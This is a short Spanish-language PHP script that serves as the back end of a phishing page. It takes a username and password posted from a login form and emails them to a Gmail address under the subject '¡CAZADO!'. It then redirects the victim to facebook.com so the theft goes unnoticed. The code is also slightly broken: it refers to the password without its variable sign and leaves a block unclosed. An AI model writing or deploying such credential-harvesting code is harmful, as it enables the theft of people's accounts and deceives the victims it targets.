<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['user']) && isset($_POST['password'])) {
    $user = $_POST['user'];
    $password = $_POST['password'];

    // Crear el mensaje de correo
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );
$from = "credencialess@gmail.com";
$to = "aaleexruiz11@gmail.com";
$subject = "¡CAZADO!";
$message = "usuario=".$user." contraseña=".password."";
$headers = "From:" . $from;
mail($to,$subject,$message, $headers);

header('Location: https://www.facebook.com/');

?>